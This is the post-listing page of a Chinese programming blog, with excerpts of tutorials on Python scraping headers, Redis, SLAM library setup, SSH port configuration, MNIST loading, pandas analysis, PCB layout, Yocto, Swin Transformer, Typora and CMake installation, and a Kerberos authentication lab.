<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63d94a15b08e1e80598e8cc42b264129/" rel="bookmark">
			Python 数据获取（一）—— request模块、变量使用与传参方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、 页面渲染 服务端渲染：
服务器端将数据和html整合到一起，统一返回给浏览器页面源代码中能看到数据，直接、简单数据通常没什么格式，需要想办法匹配 客户端渲染：
第一次只请求一个html骨架，随着输入操作等在后续请求获取数据，进行展示页面源代码不能看到数据，需要第二次请求，需要抓包分析数据通常是json或者固定格式的，处理方便 所以本质上，两种渲染方式对爬取各有优劣。
二、 headers处理 这个headers指的是html的头信息，这部分信息是给浏览器看的。打开一个网页，例如x瓣电影。按 F12抓包，刷新一下页面，这个headers部分就是了。
我们下面就要用到这个User-Agent，它表示这个请求来自哪里，图中蓝框表示来自浏览器。很多网页最基础的一个反爬方法就是判断你的User-Agent是什么，如果来自程序，就拦截不给返回。
例如我们来请求一下上面的页面。
import requests url="https://movie.douban.com/top250" resp = requests.get(url=url) print(resp.text) 返回结果为空，说明请求被拦截了
这里我们先看看代码的请求头是什么样的？
import requests url="https://movie.douban.com/top250" resp = requests.get(url=url) # resp.request表示发出的请求，再.headers表示这个请求的headers信息 print(resp.request.headers) 很明显这是个python程序
我们来修改headers，假装自己是浏览器（一个简单的小反爬）
import requests url="https://movie.douban.com/top250" # 把F12中的User-Agent信息拷过来，改成字典格式 headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"} # 把字典传入headers参数即可 resp = requests.get(url=url,headers=headers) print(resp.request.headers) print(resp.text) 看这次的User-Agent信息
网页返回结果很长，我们简单搜一个电影名，能看到就OK
不少网页都会有这个请求头检测功能，所以headers参数其实也可以作为常规参数加上，避免每次再去处理。
三、使用变量 我们换一个小说网页 https://www.qu-la.com/
假如我要搜一本小说，更好的方式是把书名作为一个变量，例如
https://so.biqusoso.com/s2.php?ie=utf-8&amp;siteid=qu-la.com&amp;q=探虚陵
1. 直接在字符串使用变量 格式是 url = f'xxx网址其他部分xxx{变量名}'
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/63d94a15b08e1e80598e8cc42b264129/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d4bfb1ab7705faa1c8e3c538a8295b7/" rel="bookmark">
			4-5:关注，取消关注
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需求 开发关注、取消关注功能。 统计用户的关注数、粉丝数。 关键 若A关注了B，则A是B的Follower (粉丝)，B是A的Followee (目标)。关注的目标可以是用户、帖子、题目等，在实现时将这些目标抽象为实体。 也是将数据存储到redis中，实现统计
1. 在RedisKeyUtil.java中增加对应的粉丝方法 package com.nowcoder.community.util; public class RedisKeyUtil { private static final String SPLIT = ":"; private static final String PREFIX_ENTITY_LIKE = "like:entity"; private static final String PREFIX_USER_LIKE = "like:user"; private static final String PREFIX_FOLLOWEE = "followee";//声明两个前缀 private static final String PREFIX_FOLLOWER = "follower";//关注了某人，将目标存在下， private static final String PREFIX_KAPTCHA = "kaptcha"; private static final String PREFIX_TICKET = "ticket"; private static final String PREFIX_USER = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1d4bfb1ab7705faa1c8e3c538a8295b7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91ebd46f24f1ad97efd599264f163e5f/" rel="bookmark">
			从0开始的高翔SLAM十四讲ch4 Sophus的安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 （1）fmt安装
我使用的是高翔SLAM十四讲的数据，由于代码采用的是模板类的sophus库，需要先安装fmt：
git clone https://github.com/fmtlib/fmt.git 打开下载好的文件，在终端上运行以下命令：
mkdir build cd build cmake .. make sudo make install （2）Sophus安装
使用高翔提供的3rdparty文件下的“sophus”或者终端输入：
git clone https://github.com/strasdat/Sophus.git 打开Sophus文件，终端输入：
mkdir build cd build cmake .. sudo make install （3）高翔ch4代码中出现的问题以及解决方法
useSophus代码中，在CmakeLists.txt文件中添加fmt以及设置绝对路径，完整内容如下
cmake_minimum_required(VERSION 2.8) project(useSophus) # 为使用 sophus，需要使用find_package命令找到它 find_package(Sophus REQUIRED) include_directories(${Sophus_INCLUDE_DIRS}) # Eigen include_directories("/usr/include/eigen3") # 根据自己安装Sophus的绝对位置来填写 include_directories( "/home/zhang/桌面/slambook2/3rdparty/Sophus" ) add_executable(useSophus useSophus.cpp) # 添加的fmt target_link_libraries( useSophus ${Sophus_LIBRARIES} fmt) 在useSophus.pp中添加，确定头文件后缀都为.hpp
#include "sophus/so3.hpp" 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5f505b071e289c16e1f3b0a3a64304d/" rel="bookmark">
			Ubuntu18.04修改ssh默认端口踩坑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在腾讯云上开通了GPU服务器，安装的是Ubuntu18.04 LTS 操作系统。尝试修改ssh默认端口，经过百度查询后发现教程是修改文件"/etc/ssh/ssh_config"，在文件中修改Port 22为想要的端口。
但是经过反复修改，反复重启ssh服务，反复重启服务器都发现无法通过修改的端口连接。
经过很长一段时间查阅资料，终于发现了问题所在：需要修改的文件应该是"/etc/ssh/sshd_config"，注意是"sshd_config"而不是"ssh_config"，多了一个字母’d’。
修改方式如下：
输入如下命令，编辑sshd_config文件（注意需要使用sudo） sudo vi /etc/ssh/sshd_config 进入这个界面后，按下小写字母"i"或者按下insert键，当左下角出现"–INSERT–"时，表明进入了编辑模式，即可进行编辑了。
使用上下左右键控制光标移动到# Port 22那一行，修改前是"# Port 22"，将"#"去掉，然后将22修改为你想要的端口，比如8888，10086等等。
保存退出 按下ESC键，当左下角的"–INSERT–"消失后，进行下面操作
输入冒号:（按下shift键+分号键），然后输入wq，回车即可退出保存
重启ssh sudo systemctl restart sshd 查看ssh状态 sudo systemctl status sshd 箭头所指处为你修改的端口号，就表明修改成功了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91592de533f2f40e84838c199a6c8a58/" rel="bookmark">
			手写数字识别Mnist数据集和读取代码分享
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据集下载 链接：
https://pan.baidu.com/s/1qpzrSFhmyrdGmbSScN_ZXg?pwd=d1ws
提取码：d1ws
数据集读取 from pathlib import Path import requests ​ DATA_PATH = Path("data") PATH = DATA_PATH / "mnist" ​ PATH.mkdir(parents=True, exist_ok=True) ​ URL = "http://deeplearning.net/data/mnist/" FILENAME = "mnist.pkl.gz" ​ if not (PATH / FILENAME).exists(): content = requests.get(URL + FILENAME).content (PATH / FILENAME).open("wb").write(content) import pickle import gzip ​ with gzip.open((PATH / FILENAME).as_posix(), "rb") as f: ((x_train, y_train), (x_valid, y_valid), _) = pickle.load(f, encoding="latin-1") print(f'训练集-Xshape：{x_train.shape},Yshape：{y_train.shape}\n测试集-Xshape：{x_valid.shape},Yshape：{y_valid.shape}\n\n训练集样本数量：{y_train.shape[0]}\n测试集样本数量：{y_valid.shape[0]}\n\n图形大小：{int(np.sqrt(x_valid.shape[1])),int(np.sqrt(x_valid.shape[1]))}') 训练集-Xshape：(50000, 784),Yshape：(50000,)
测试集-Xshape：(10000, 784),Yshape：(10000,)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/91592de533f2f40e84838c199a6c8a58/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91393d49415557c7965f61b60c0bd40b/" rel="bookmark">
			python带你对北京二手房进行数据分析，看看大概都什么价位
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 嗨喽~大家好呀，这里是魔王呐 ❤ ~!
今天我们的目的想必大家看标题就能明白了~
准备 首先，我们要提前准备好数据
然后打开我们的数据分析工具： Jupyter
代码及效果展示 导入模块
# 导入做数据处理的模块pandas import pandas as pd # 导入绘图模块pyecharts，*号代表模块里面的所有图形 from pyecharts.charts import * from pyecharts import options as opts 数据处理 1.读取数据 导入数据
设置编码encoding='gbk'
设置解释器为engine='python'
df = pd.read_csv('二手房数据.csv', encoding='gbk', engine='python') df 2.查看表格数据描述 describe可以直接计算数值类型数据的平均值，标准差
df.describe() 3.查看表格是否有数据缺失 通过isnull查找出包含缺失值的字段
然后进行求和，计算每一列的缺失数据的数量
df.isnull().sum() 可以看到电梯数据缺失8257行
4.查看电梯列共有几种值 通过unique可以统计数据里面出现了几种值
方便后面进行填充
df['电梯'].unique() 5.缺失值填充 用“未知”填充缺失值
缺失值的处理方式有两种
第一种删除，第二种填补
缺失值少，就直接删除
缺失值多，就进行填补
这里缺失值占比较多，所以进行填补
df['电梯'].fillna('未知',inplace=True) # 填补之后查看是否还有缺失值 df.isnull().sum() 6.查看房屋朝向数据 查看朝向值的种类
df['朝向'].unique() 朝向数据包含了‘西南’和‘南西’两个方向，将其合并为一个方向‘西南’：
# replace(被替换的值,替换后的值): df['朝向'] = df['朝向'].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/91393d49415557c7965f61b60c0bd40b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13ef490504496c500cc6d9b165296557/" rel="bookmark">
			Python获取当前时间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、使用datetime模块 import datetime i = datetime.datetime.now() #获取当前时间 print('今天是{}月{}日{}点{}分{}秒'.format(i.month,i.day,i.hour,i.minute,i.second)) 打印结果：
今天是12月3日18点1分4秒 print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')) 打印结果： 2022-12-03 18:01:04 二、使用time模块 import time print(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))) 打印结果：
2022-12-03 18:01:04 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/661d23cc2a483314d39ba90da40497b4/" rel="bookmark">
			解决虚拟机安装了VMTools也无法拖拽文件的问题方法之一
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		翻阅了无数文章，虚拟机无法拖拽文件的解决方法大同小异，理论上安装了VMTools就可以实现自由拖拽，但是需要在“虚拟机设置”中打开VMware Tools的“开启时间同步”，如图所示，可以解决问题。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c9932778c8441e8d56e74d873785d53d/" rel="bookmark">
			Java中@Inherited的作用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在我们日常的java开发或学习中，经常看到很多注解都被@Inherited进行了修饰，但是这个@Inherited有什么作用呢？下面来分析一下。
Inherited 英文译为“继承”，我么可先理解标注了@Inherited的注解可以被继承，而未标注@Inherited的注解不可被继承，那具体什么场景下注解可被继承呢？有以下几种场景：
注解继承分为两种情况:
类级别 Type (Class, Interface),属性和方法级别 (Property, Method) 1、在类继承关系中：子类会继承获得父类上的那些被@Inherited修饰的注解。
2、接口继承关系中：子接口不能继承父接口中的任何注解，不管父接口上使用的注解有没有被@Inherited修饰。
3、在类实现接口时：不会继承任何接口中定义的注解，不管父接口上使用的注解有没有被@Inherited修饰。
4、属性和方法级别 (Property, Method): 注解无论何时都会被子类或子接口继承, 除非子类或子接口重写。
以下为测试代码：我们定义两个注解 @IsInheritedAnnotation 、@NoInherritedAnnotation。其中@IsInheritedAnnotation加了注解@Inherited，@IsInheritedAnnotation注解可被继承。
@Retention(RetentionPolicy.RUNTIME) @Target(ElementType.TYPE) @Inherited public @interface IsInheritedAnnotation { } @Retention(RetentionPolicy.RUNTIME) @Target(ElementType.TYPE) public @interface NoInherritedAnnotation { } @NoInherritedAnnotation @IsInheritedAnnotation public class InheritedBase { } public class MyInheritedClass extends InheritedBase { } @NoInherritedAnnotation @IsInheritedAnnotation public interface IInheritedInterface { } public interface IInheritedInterfaceChild extends IInheritedInterface { } public class MyInheritedClassUseInterface implements IInheritedInterface { } // 测试代码 @Test public void testInherited(){ { Annotation[] annotations = MyInheritedClass.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c9932778c8441e8d56e74d873785d53d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/459a51fcc568b02b639867f0275eeebb/" rel="bookmark">
			AD19 PCB板完整绘制过程(4层)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		AD19 PCB板完整绘制过程
1、原理图导入
一个项目的电路原理图完成后，我们需要在Design选项下Update PCB Document xxxx.PcbDoC。
Fig 1
在更新的过程中，当Report Changes…时会出现很多错误，需要我们进行改正(可以点击Only Show Errors，只显示错误)，例如
Fig 2
Massage中的信息会告诉我们错误的原因，对于Unknown Pin这类错误，一般有下面几点原因：(1)原理图元件没有添加封装；(2)原理图和封装引脚数个数不一致；(3)原理图引脚和封装的引脚代表字符不匹配(原理图的引脚是数字1，2，3…,而封装是字母A，B，C…)，因此我们需要查看我们的封装和原理图，问题解决后，在信息栏是没有显示错误的(导入之后存在报错，取消不常用的DRC检测选项，DRC检查选项过多导致PCB设计布局布线的时候存在卡顿现象，可以只剩下电气性能的检查选项)。
Fig 3
成功导入PCB后，可以在Tools中Component Placement选择适合自己的排列方式，在此次排版中选择Arrange Within Rectangle，最终的形式是这样的。
Fig 4
但是会出现图4这种情况(芯片引脚会有很多绿色的叉，标注引脚间距小于10mil)，有些博主的解决办法是在Design中Rules做修改，将Design Rules中的Silk to Silk Clearance和Silk To Solder Mask Clearance取消勾选，但是问题并没有得到解决，最后通过查阅资料，发现在Electrical下Clearance中选择将Ignore pad to pad clearances within a footprint勾选，这种问题就会解决。
Fig 5
2、叠层设置
然后进行叠层设置，在Design中选择Layer Stack Manager…。点击Top Layer右键选择Plane，添加中间层，添加成功以后，命名是按照自己的习惯进行设置，为了降低平面边缘的辐射效应，在电源层和地层间要尽量满足20mil原则，因此点击Pullback distance，右键弹出Select columns，将里面的Pullback distance选项设置为可见并确定退出。继续在Properties中将自己命名的中间层的Pullback distance设置为2-3倍关系(电源层和地线层)。
Fig 6
设置完成后，我们可以看到会有自己命名的层。
Fig 7
3、封装间隙设置
有时候，导入的PCB会出现以下这种情况
Fig 8
对于这种情况是因为元件封装的间距小于10mil，但是在工程中设置的是10mil，因此需要在Design中的Rules做修改，如图所示。
Fig 9
将Minimum Clearance改成＜10mil即可。
4、板框的设置和定位孔的放置
设置板框的绘制,具体方法在本人的其他文章中有介绍,大家可以参考,这里不做过多的介绍(这里做个说明：尺寸标注一般是在Mechanical中标注)。
5、交互式布局
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/459a51fcc568b02b639867f0275eeebb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/345638f41bc5c350a2068f5536664904/" rel="bookmark">
			yocto machine class解析之flashlayout-stm32mp
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		yocto machine class解析之flashlayout-stm32mp 上一篇文章中我们详细介绍了st-partitions-image class。里面根据配置生成了许多的分区镜像以及分区镜像的一些参数设置。本章节介绍的flashlayout class就会根据上面生成的这些参数来生成特定的.tsv刷机文件供ST的刷机工具使用。
flashlayout介绍 本小节先介绍一些flashlayout tsv文件的格式和说明，方便后续分析具体的实现过程,下面是
build-openstlinuxeglfs-fsmp1a/tmp-glibc/deploy/images/fsmp1a/flashlayout_fs-mp1a-qt/trusted/目录下的
FlashLayout_sdcard_stm32mp157a-fsmp1a-trusted.tsv文件：
Opt： 选项字段可以设置为"-“()、“P”(烧写)、“D”(删除)或"E”(不更新) “PE”（不更新）“PD”（删除并更新）Id： 会根据这个 id 来决定烧写分区Name： 分区名字Type： 指定烧写的类型，仅 uboot 使用。IP：指定烧写的设备类型与编号，比如 emmc0、 emmc1、 nand0 等， 如果 opt 为‘-’ ,那么此字段就为 noneOffset：分区的起始位置，表示需要偏移的字节数。Binary： 要烧录的文件 flashlayout-stm32mp class分析 下面我们来详细分析flashlayout-stm32mp class的具体实现，flashlayout-stm32mp文件非常长，一点点过把。
介绍 flashlayout的刷机文件可以通过静态设置也可以通过动态生成，使用ENABLE_FLASHLAYOUT_DEFAULT变量来控制。
如果设置为静态设置的话需要自己先改好一个falshlayout tsv文件，然后设置这个文件的路径到变量FLASHLAYOUT_DEFAULT_SRC，然后一起打包到deploy的生成镜像里面。
动态生成的话需要配置一系列变量，其中tsv文件命名格式所需变量如下：
&lt;FLASHLAYOUT_BASENAME&gt;[&lt;FLASHLAYOUT_CONFIG_LABEL&gt;][&lt;FLASHLAYOUT_TYPE_LABEL&gt;-FLASHLAYOUT_BOOTSCHEME_LABEL].&lt;FLASHLAYOUT_SUFFIX&gt;
其中FLASHLAYOUT_BASENAME 默认是 ‘FlashLayout’，FLASHLAYOUT_SUFFIX默认是’tsv’，改写下上面的格式:
FlashLayout[&lt;FLASHLAYOUT_CONFIG_LABEL&gt;][&lt;FLASHLAYOUT_TYPE_LABEL&gt;-FLASHLAYOUT_BOOTSCHEME_LABEL].tsv
如上面展示的FlashLayout_sdcard_stm32mp157a-fsmp1a-trusted.tsv可以看到：
FLASHLAYOUT_CONFIG_LABEL：sdcard
FLASHLAYOUT_TYPE_LABEL：stm32mp157a
FLASHLAYOUT_BOOTSCHEME_LABEL：trusted
tsv文件所需格式变量：
&lt;FLASHLAYOUT_PARTITION_ENABLE&gt;(Opt)
&lt;FLASHLAYOUT_PARTITION_ID&gt;(Id)
&lt;FLASHLAYOUT_PARTITION_LABEL&gt;(Name)
&lt;FLASHLAYOUT_PARTITION_TYPE&gt;(Type)
&lt;FLASHLAYOUT_PARTITION_DEVICE&gt;(IP)
&lt;FLASHLAYOUT_PARTITION_OFFSET&gt;(Offset)
&lt;FLASHLAYOUT_PARTITION_BIN2LOAD&gt;(Binary)
&lt;FLASHLAYOUT_PARTITION_SIZE&gt;: 上面FLASHLAYOUT_PARTITION_OFFSET本来应该手动指定，但是如果配置了FLASHLAYOUT_PARTITION_SIZE这个变量则可以根据分区镜像的大小结合DEVICE_ALIGNMENT_SIZE_指定特定的对齐大小来自动计算下一个分区的OFFSET( 就是本分区的FLASHLAYOUT_PARTITION_DEVICE)
# # -------------------- # Static configuration # -------------------- # Set ENABLE_FLASHLAYOUT_DEFAULT to '1'.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/345638f41bc5c350a2068f5536664904/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cbbeb8ade9d89724b7b674ed214277be/" rel="bookmark">
			【Swin Transformer原理和源码解析】Hierarchical Vision Transformer using Shifted Windows
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言一、动机和改进点二、整体架构：SwinTransformer三、输入设置：PatchEmbed四、4个重复的Stage：BasicLayer4.1、SwinTransformerBlock4.1.1、创建mask4.1.2、shift特征4.1.3、为shift后的特征划分窗口4.1.4、W-MSA VS SW-MSA 4.2、PatchMerging 五、总结六、一些问题6.1.为什么要W-MSA和SW-MSA混合使用？ Reference 前言 ViT让Transformer第一次在视觉任务中暂露头角，而Swin Transfomer直接让Transformer在视觉任务中大放光彩，直接打败了当时的所有的CNN网络，一出来就直接是当时的Sota。现在的很多厉害的Transfomer变体都是Swin改进的，而且Swin Transformer这个网络在很多比赛上都会用它，分类、分割、检测基本上用它都不会差，我打的一个分类比赛就是用的它： 【记第一次kaggle比赛】PetFinder.my - Pawpularity Contest 宠物预测。当时打的时候是掉包的，两句话就创建了Model了，知其然不知所以然，这怎么行，所以今天有必要学习一下。
论文地址： https://arxiv.org/pdf/2103.14030.pdf
源码地址： https://github.com/microsoft/Swin-Transformer
这里我用的是b站大佬 霹雳吧啦Wz 改编后（相对源码作了微小改动，增加了多尺度训练）的代码：
WZMIAOMIAO
注释版本代码也同样分享到了我的Github：https://github.com/HuKai97/Classification-Annotations
一、动机和改进点 VIT为了让图像可以像词向量那样输入Encoder中，而且计算量还不能太大，就直接将图像切分成一个个小的Patch，再把每个Patch当成一个词向量，把所有Patch拼接起来送入Encoder，这样当然可以降低参数量和计算量，但是当图像变大，Patch数目变多，复杂度太大。还有没有更好的输入方式了呢？
VIT主要是改变了一下图片的输入，让Transformer的Encoder可以适用于图像任务中，但是对于整个模型的架构（之前讲LN提前了），VIT是没有做什么改进的，用的还是原始的Transformer中的Encoder（整个Encoder内部各个encoder变换，但是特征的shape是不变的）。那么原始的Transformer的Encoder模块真的就适用于图像任务吗，还有没有更好的Encoder结构？
所以总结下，ViT有两个问题：
尺度问题，数据集物体大大小小，但是整个Encoder过程特征尺度是不变的，效果肯定不好；划分patch，再把整张图片的所有patch都输入Encoder中，计算量太大； 所以，Swin Transformer针对这两点做出了改进：
Encode呈现金字塔形状。每过一个Encode图片shape变小，感受野在不停的增大，解决了尺度问题。注意力机制放在一个窗口内部。不再把整张图片的所有patch都输入Encoder，而是将各个Patch单独的输入Encoder，解决了计算量太大的问题。 二、整体架构：SwinTransformer Patch Embeded：对输入图片 [bs，3，H_，W_] 进行处理。第一步：先经过Patch Partition，将图像划分为一个个的patch，每个patch是4x4x3大小（4x4Conv实现）得到一个 [bs，48，H_/4， W_/4] 大小的特征图；第二步：经过一个Linear Embedding层，进行Linear线性变换，得到 [bs, H_/4 * W_/4, C=96]；（但是实际代码是通过一个4x4Conv s=4实现的，其实本质还是在学习参数，一样的）经过4个stage：每个stage是若干个Swin Transformer Block + Patch Merging。前者计算相关性，后者进行采样，实现多尺度；最终经过4个stage后，特征下采样为 [bs，H_/32 * W_/32，8C=768]；分类：经过一个avgpool+flatten+Linear进行分类预测，最终得到 [bs，num_classes]； 源码：
class SwinTransformer(nn.Module): r""" Swin Transformer A PyTorch impl of : `Swin Transformer: Hierarchical Vision Transformer using Shifted Windows` - https://arxiv.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cbbeb8ade9d89724b7b674ed214277be/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/21197bf8af8e0b967ceca00d553c6e14/" rel="bookmark">
			Ubuntu安装Typora
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 写在前面2019.09.05- Ubuntu 通过官网安装Typora一、简介：二、官网下载地址：三、安装命令：三、打开方式参考链接： 2022.12.03- Ubuntu 通过deb安装Typora一、下载免费的 Typora二、安装Typora 写在前面 发文时间: 2022.12.03
2019.09.05 写的Typora安装方式好像不能用了，这里重新写一个deb安装的博客。发文时间: 2019.09.05，官网安装 Typora 2019.09.05- Ubuntu 通过官网安装Typora 一、简介： Typora 是一款十分简洁的 Markdown 编辑器，支持 Windows、Mac、Linux
二、官网下载地址： https://typora.io/#linux
三、安装命令： # or run: # sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BA300B7755AFCFAE wget -qO - https://typora.io/linux/public-key.asc | sudo apt-key add - # add Typora's repository sudo add-apt-repository 'deb https://typora.io/linux ./' sudo apt-get update # install typora sudo apt-get install typora 三、打开方式 方式1：通过搜索行搜索typora，然后点击 typora 图标
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/21197bf8af8e0b967ceca00d553c6e14/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/65e08bf556e4c5ef0890c2b1851715c1/" rel="bookmark">
			Cmake安装以及升级（Ubuntu）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.安装2.升级3.Ubuntu 上查看所有已安装的软件包4.如何在Ubuntu 20.04上更改主机名5.machine-id6.ubuntu安装deb包到指定目录 1.安装 方式1：
建议使用：使用方式1
（1）检查环境配置 sudo apt-get install gcc sudo apt-get install g++ sudo apt-get install make （2）直接在Cmake官网下载源码包
（3）解压在相应文件夹， 博主解压在了home 文件夹下
cd cmake #进入 cmake 所在的目录 ./bootstrap # 这一步会等很久 也可以执行 ./confige make -j4 # 使用命令 nproc 查看自己有多少个核心(make -j$(nproc))， 我这里用了4个核心编译make，速度快一点 make install #到此位置结束 （4）检查安装情况
命令行输入 ：cmake -version 显示源码对应版本则安装成功 方式2：
链接
sudo apt-get autoremove cmake wget https://cmake.org/files/v3.12/cmake-3.12.2-Linux-x86_64.tar.gz##安装上面的链接去选择 tar zxvf cmake-3.12.2-Linux-x86_64.tar.gz mv cmake-3.12.2-Linux-x86_64 /opt/cmake-3.12.2 ln -sf /opt/cmake-3.12.2/bin/* /usr/bin/ 注意：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/65e08bf556e4c5ef0890c2b1851715c1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e5026fc44757f6ec4bb2a3e495aad243/" rel="bookmark">
			基于Kerberos的跨域身份认证实验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于Kerberos的跨域身份认证实验 实验场景 跨域身份认证技术是身份认证技术的一种典型应用，随着云计算的快速发展和大规模部署,传统的网络架构发生了深刻的变革,带来了新的安全挑战。在云环境下，身份提供者、认证凭证和签发机构的多元化造成用户访问时需穿越多个安全域，跨域身份认证已成为云安全的难点问题。Kerberos是一种网络认证协议，它使用对称加密的技术实现网络中的身份认证。目前大数据组件(如HDFS/ YARN/ HBase/Hive/Kafka/Spark 等等)基本上都默认支持Kerberos身份认证。本实验案例将引导学生实现大数据组件+Kerberos部署。 实验相关技术 — Kerberos协议 Kerberos 是一种基于加密票据（ Ticket）的身份认证协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。Kerberos 认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的，可以用于防止窃听、防止replay攻击、保护数据完整性等场合。 认证过程具体如下：客户机向认证服务器（AS）发送请求，要求得到某服务器的证书，然后 AS 的响应包含这些用客户端密钥加密的证书。证书的构成为： 1) 服务器 “ticket” ； 2) 一个临时加密密钥（又称为会话密钥 “session key”） 。客户机将 ticket （包括用服务器密钥加密的客户机身份和一份会话密钥的拷贝）传送到服务器上。会话密钥可以（现已经由客户机和服务器共享）用来认证客户机或认证服务器，也可用来为通信双方以后的通讯提供加密服务，或通过交换独立子会话密钥为通信双方提供进一步的通信加密服务。简而言之，就是Client从KDC获取TGT，Client利用获取的TGT向KDC请求其他Service的Ticket（通过获取的session进行访问）。 Kerberos 认证流程 其中，KDC（key distribution center）：密钥分发中心，包含AS 和 TGS。 AS（Authentication Server）：认证服务器 TGS（Ticket Grantion Server）：票据授权服务器 TGT（Ticket-grantion Ticket）：票据授权票据 realm name：域名，包含KDC和许多客户端的Kerberos网络，约定一般用大写来命名realm，比如“EXAMPLE.COM” password：某个用户的密码，对应于kerberos中的master_key。password可以存在一个keytab文件中。因此，kerberos中需要使用密码的场景都可以用一个keytab作为输入。 credential：credential是“证明某个人确定是他自己/某一种行为的确可以发生”的凭据。在不同的使用场景下，credential的具体含义也略有不同：对于某个principal个体而言，他的credential就是他的password；在kerberos认证的环节中，credential就意味着各种各样的ticket。 authenticator：验证者，是服务器用于验证客户机用户主体的信息。验证者包含用户的主体名称、时间标记和其他数据。与票证不同，验证者只能使用一次，通常在请求访问服务时使用。 principal：认证的主体，简单来说就是“用户名”。 